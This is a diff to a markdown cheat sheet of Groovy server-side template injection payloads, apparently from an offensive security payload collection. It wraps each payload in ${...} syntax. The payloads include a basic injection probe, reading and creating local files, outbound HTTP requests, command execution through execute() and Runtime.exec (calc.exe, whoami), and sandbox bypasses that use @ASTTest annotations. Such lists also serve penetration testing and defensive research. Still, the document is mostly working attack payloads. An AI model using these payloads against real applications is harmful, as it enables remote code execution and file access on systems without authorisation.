@@ -194,48 +194,45 @@ ${dwf.newInstance(ec,null)("id")}
 
 [Official website](https://groovy-lang.org/)
 
-
 ### Groovy - Basic injection
 
 Refer to https://groovy-lang.org/syntax.html , but `${9*9}` is the basic injection.
 
-
 ### Groovy - Read and create File
 
 ```groovy
-String x = new File('c:/windows/notepad.exe').text
-String x = new File('/path/to/file').getText('UTF-8')
-new File("C:\Temp\FileName.txt").createNewFile();
+${String x = new File('c:/windows/notepad.exe').text}
+${String x = new File('/path/to/file').getText('UTF-8')}
+${new File("C:\Temp\FileName.txt").createNewFile();}
 ```
 
 ### Groovy - HTTP request:
 
-
 ```groovy
-"http://www.google.com".toURL().text
-new URL("http://www.google.com").getText()
+${"http://www.google.com".toURL().text}
+${new URL("http://www.google.com").getText()}
 ```
 
 ### Groovy - Command Execution
 
 ```groovy
-"calc.exe".exec()
-"calc.exe".execute()
-this.evaluate("9*9") //(this is a Script)
-new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()
+${"calc.exe".exec()}
+${"calc.exe".execute()}
+${this.evaluate("9*9") //(this is a Script class)}
+${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
 ```
 
 ### Groovy - Sandbox Bypass
 
 ```groovy
-@ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
-def x
+${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
+def x }
 ```
 
 or
 
 ```groovy
-new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
+${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
 ```
 
 ---
